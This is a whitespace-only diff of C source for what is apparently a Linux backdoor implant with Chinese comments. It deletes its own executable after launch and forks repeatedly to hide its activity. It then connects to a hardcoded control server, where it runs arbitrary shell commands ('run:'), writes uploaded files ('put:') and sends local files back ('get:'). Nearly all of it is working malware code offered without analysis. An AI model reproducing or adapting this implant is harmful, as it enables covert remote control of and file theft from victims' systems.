@@ -71,13 +71,13 @@ int read_cmd(int sockfd, char *result)
     write(sockfd, "[get cmd]\n", 10);
     memset(result, 0, BUFSIZE);
     int bytes = recv(sockfd, result, BUFSIZE, 0);
-	if(bytes == -1)
-	{
-		if(DEBUG)
-			printf("read command from server failed\n");
-		exit(-1);
-	}
-	return bytes;
+    if(bytes == -1)
+    {
+        if(DEBUG)
+            printf("read command from server failed\n");
+        exit(-1);
+    }
+    return bytes;
 }
 
 /*
@@ -89,38 +89,38 @@ int executeCMD(const char *cmd, char *result)
     char ps[1024]={0};   
     FILE *pFile;   
     strcpy(ps, cmd);   
-	memset(result, 0, CMD_RES_SIZE);
+    memset(result, 0, CMD_RES_SIZE);
     if((pFile = popen(ps, "r")) != NULL)   
     {   
-		int bytes;
-		int total_bytes = 0;
+        int bytes;
+        int total_bytes = 0;
         while(!feof(pFile))
-		{
-			total_bytes = fread(result, 1, CMD_RES_SIZE, pFile);
-			break;
-			//bytes = fread(buf_ps, 1, 1024, pFile);
-			//if (bytes < 0)
-			//{
-			//	pclose(pFile);
-			//	return total_bytes;
-			//}
-			//memcpy(result + total_bytes, buf_ps, bytes);
-			//total_bytes += bytes;
+        {
+            total_bytes = fread(result, 1, CMD_RES_SIZE, pFile);
+            break;
+            //bytes = fread(buf_ps, 1, 1024, pFile);
+            //if (bytes < 0)
+            //{
+            //  pclose(pFile);
+            //  return total_bytes;
+            //}
+            //memcpy(result + total_bytes, buf_ps, bytes);
+            //total_bytes += bytes;
             //if(total_bytes >= CMD_RES_SIZE - 10)   
             //    break;   
         }   
         pclose(pFile);   
         pFile = NULL;   
-		return total_bytes;
+        return total_bytes;
     }   
     else  
     {   
-		if(DEBUG)
-		{
-			printf("popen %s error\n", ps);
-			exit(-1);
-		}
-		return 0;
+        if(DEBUG)
+        {
+            printf("popen %s error\n", ps);
+            exit(-1);
+        }
+        return 0;
     }   
 } 
 
@@ -131,121 +131,121 @@ int executeCMD(const char *cmd, char *result)
  */
 int parse_cmd(int sockfd, char *cmd, char *result)
 {
-	/*删除掉命令末尾的结束标志*/
+    /*删除掉命令末尾的结束标志*/
     char *cmd_end = strstr(cmd, "[!FINISHED");
     cmd_end[0] = '\0';
-	
+    
     int index = 0;
-	int ret = 0;
+    int ret = 0;
 
 
-	if(strncmp(cmd, "run:", 4) == 0)
-	/*远程命令执行，格式 run:[空格]commmand*/
-	{
-		index += 4;
-		while(cmd[index] == ' ') index++;
-		int line_end = index;
-		while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1) line_end++;
-		char cmd_run[BUFSIZE];
-		strncpy(cmd_run, cmd+index, line_end - index + 1);
-		if (DEBUG)
-			printf("run cmd: %s\n", cmd_run);
-		ret = executeCMD(cmd_run, result);
-	}
-	else if(strncmp(cmd, "put:", 4) == 0)
-	/*文件上传，格式：put:[空格]服务器本地文件路径[空格]文件存储名*/
-	{
-		index += 4;
-		while(cmd[index] == ' ') index++;
-		while(cmd[index] != ' ') index++;
-		while(cmd[index] == ' ') index++;
-		int line_end = index;
-		while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
-		char filepath[BUFSIZE];
-		
-		/*读取文件存储名*/
-		strncpy(filepath, cmd+index, line_end - index);
-		
-		/*文件传输准备*/
-		write(sockfd, "ready\n", 6);
-		FILE *fp = fopen(filepath, "wb");
-		char buf[BUFSIZE];
-		char *end_ptr = NULL;
-		
-		/*接收文件*/
-		do {
-			memset(buf, 0, BUFSIZE);
-			int bytes = recv(sockfd, buf, BUFSIZE, 0);
-			if(bytes > 0)
-			{
-				//文件接收结束标志为[!FINISHED]
-				end_ptr = strstr(buf, "[!FINISHED]");
-				if (end_ptr != NULL)
-				{
-					bytes = end_ptr - buf;
-				}
-				//将接收的数据写入文件
-				int wbytes = fwrite(buf, 1, bytes, fp);
-				if (wbytes != bytes)
-				{
-					if (DEBUG)
-						printf("something goes wrong when writing file\n");
-					break;
-				}
-			}
-			else if(bytes == -1)
-			{
-				//异常结束，关闭文件后退出程序
-				fclose(fp);
-				exit(-1);
-			}
-		} while(!end_ptr);
-		fclose(fp);
-		write(sockfd, "recv ok\n", 8);
-		return 0;
-	}
-	else if(strncmp(cmd, "get:", 4) == 0)
-	/*下载文件，格式：get:[空格]受控端文件路径*/
-	{
-		index += 4;
-		while(cmd[index] == ' ') index++;
-		int line_end = index;
-		while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
-		char filepath[BUFSIZE];
-		
-		//读取文件名
-		strncpy(filepath, cmd+index, line_end - index);
-		
-		//文件下载准备
-		write(sockfd, "ready\n", 6);
-		FILE *fp = fopen(filepath, "rb");
-		if (!fp)
-		{
-			//文件打开失败
-			write(sockfd, "[ERROR]找不到指定文件或没有权限\n", 20);
-			exit(-1);
-		}
-		
-		//开始文件传输
-		char buf[BUFSIZE];
-		do {
-			memset(buf, 0, BUFSIZE);
-			int bytes = fread(buf, 1, BUFSIZE, fp);
-			if(bytes > 0)
-			{
-				write(sockfd, buf, bytes);
-			}
-			else if(bytes == -1)
-			{
-				break;
-			}
-		} while(!feof(fp));
-		fclose(fp);
-		write(sockfd, "[!FINISHED]\n", 12);
-		write(sockfd, "send ok\n", 8);
-		return 0;
-	}
-	return ret;
+    if(strncmp(cmd, "run:", 4) == 0)
+    /*远程命令执行，格式 run:[空格]commmand*/
+    {
+        index += 4;
+        while(cmd[index] == ' ') index++;
+        int line_end = index;
+        while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1) line_end++;
+        char cmd_run[BUFSIZE];
+        strncpy(cmd_run, cmd+index, line_end - index + 1);
+        if (DEBUG)
+            printf("run cmd: %s\n", cmd_run);
+        ret = executeCMD(cmd_run, result);
+    }
+    else if(strncmp(cmd, "put:", 4) == 0)
+    /*文件上传，格式：put:[空格]服务器本地文件路径[空格]文件存储名*/
+    {
+        index += 4;
+        while(cmd[index] == ' ') index++;
+        while(cmd[index] != ' ') index++;
+        while(cmd[index] == ' ') index++;
+        int line_end = index;
+        while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
+        char filepath[BUFSIZE];
+        
+        /*读取文件存储名*/
+        strncpy(filepath, cmd+index, line_end - index);
+        
+        /*文件传输准备*/
+        write(sockfd, "ready\n", 6);
+        FILE *fp = fopen(filepath, "wb");
+        char buf[BUFSIZE];
+        char *end_ptr = NULL;
+        
+        /*接收文件*/
+        do {
+            memset(buf, 0, BUFSIZE);
+            int bytes = recv(sockfd, buf, BUFSIZE, 0);
+            if(bytes > 0)
+            {
+                //文件接收结束标志为[!FINISHED]
+                end_ptr = strstr(buf, "[!FINISHED]");
+                if (end_ptr != NULL)
+                {
+                    bytes = end_ptr - buf;
+                }
+                //将接收的数据写入文件
+                int wbytes = fwrite(buf, 1, bytes, fp);
+                if (wbytes != bytes)
+                {
+                    if (DEBUG)
+                        printf("something goes wrong when writing file\n");
+                    break;
+                }
+            }
+            else if(bytes == -1)
+            {
+                //异常结束，关闭文件后退出程序
+                fclose(fp);
+                exit(-1);
+            }
+        } while(!end_ptr);
+        fclose(fp);
+        write(sockfd, "recv ok\n", 8);
+        return 0;
+    }
+    else if(strncmp(cmd, "get:", 4) == 0)
+    /*下载文件，格式：get:[空格]受控端文件路径*/
+    {
+        index += 4;
+        while(cmd[index] == ' ') index++;
+        int line_end = index;
+        while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
+        char filepath[BUFSIZE];
+        
+        //读取文件名
+        strncpy(filepath, cmd+index, line_end - index);
+        
+        //文件下载准备
+        write(sockfd, "ready\n", 6);
+        FILE *fp = fopen(filepath, "rb");
+        if (!fp)
+        {
+            //文件打开失败
+            write(sockfd, "[ERROR]找不到指定文件或没有权限\n", 20);
+            exit(-1);
+        }
+        
+        //开始文件传输
+        char buf[BUFSIZE];
+        do {
+            memset(buf, 0, BUFSIZE);
+            int bytes = fread(buf, 1, BUFSIZE, fp);
+            if(bytes > 0)
+            {
+                write(sockfd, buf, bytes);
+            }
+            else if(bytes == -1)
+            {
+                break;
+            }
+        } while(!feof(fp));
+        fclose(fp);
+        write(sockfd, "[!FINISHED]\n", 12);
+        write(sockfd, "send ok\n", 8);
+        return 0;
+    }
+    return ret;
 }
 
 /*
@@ -261,23 +261,23 @@ void *do_exit(void *arg)
 int main()
 {
     char *self_path = getpath();
-	
-	//启动程序后删除可执行文件
+    
+    //启动程序后删除可执行文件
     remove(self_path);
-	
+    
     int count = -1;
     while(1)
     {
         count += 1;
         pid_t pid = fork();
         if (pid < 0)
-		{
-			if(DEBUG)
-				printf("there is something wrong\n");
-		}
+        {
+            if(DEBUG)
+                printf("there is something wrong\n");
+        }
         if (pid > 0) //父进程
         {
-			/*每执行0x1000次fork则连接一次服务器*/
+            /*每执行0x1000次fork则连接一次服务器*/
             if (count & 0xfff)
             {
                 exit(0);
@@ -288,20 +288,20 @@ int main()
             pthread_t do_exit_tid;
             int err = pthread_create(&do_exit_tid, NULL, do_exit, NULL);   
             if(err != 0){
-				if(DEBUG)
-					printf("create thread error: %s/n",strerror(err));  
+                if(DEBUG)
+                    printf("create thread error: %s/n",strerror(err));  
                 return -1;  
             }  
-			
+            
             //time_t start = time(NULL);
             char cmd[BUFSIZE], result[CMD_RES_SIZE];
             int sockfd = create_socket(SERVER_IP, SERVER_PORT);
             int bytes = read_cmd(sockfd, cmd);
-			if(bytes <= 0)
-				return 0;
+            if(bytes <= 0)
+                return 0;
             bytes = parse_cmd(sockfd, cmd, result);
-			if (bytes > 0)
-				write(sockfd, result, bytes);
+            if (bytes > 0)
+                write(sockfd, result, bytes);
             close(sockfd);
             //time_t end = time(NULL);
             //printf("spend time %ds\n", end - start );
@@ -311,8 +311,8 @@ int main()
         else
         {
             usleep(500);
-			if (DEBUG)
-				return 0;
+            if (DEBUG)
+                return 0;
         }
     }
     return 0;
